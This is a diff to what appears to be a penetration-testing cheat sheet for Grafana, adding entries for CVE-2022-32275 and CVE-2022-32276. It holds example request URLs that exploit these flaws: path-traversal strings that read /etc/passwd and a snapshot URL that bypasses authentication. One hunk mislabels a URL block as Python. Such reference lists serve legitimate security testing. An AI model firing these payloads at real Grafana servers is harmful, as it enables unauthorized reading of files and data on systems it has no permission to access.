@@ -18,7 +18,7 @@ https://target/api/snapshots
 ## CVE-2021-43798
  Grafana versions 8.0.0-beta1 through 8.3.0 (except for patched versions) iss vulnerable to directory traversal, allowing access to local files. The vulnerable URL path is: `<grafana_host_url>/public/plugins//`, where is the plugin ID for any installed plugin.
 
- ```url
+ ```python
 https://target/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd
  ```
 
@@ -44,3 +44,16 @@ The snapshot feature in Grafana 6.7.3 through 7.4.1 can allow an unauthenticated
 https://target/api/snapshots
 ```
 
+## CVE-2022-32275
+Grafana 8.4.3 allows reading files via (for example) a /dashboard/snapshot/%7B%7Bconstructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd URI.
+
+```
+ https://target/dashboard/snapshot/%7B%7Bconstructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd
+```
+
+## CVE-2022-32276
+** DISPUTED ** Grafana 8.4.3 allows unauthenticated access via (for example) a /dashboard/snapshot/*?orgId=0 URI. NOTE: the vendor considers this a UI bug, not a vulnerability.
+
+```
+https://target/dashboard/snapshot/*?orgId=0
+```
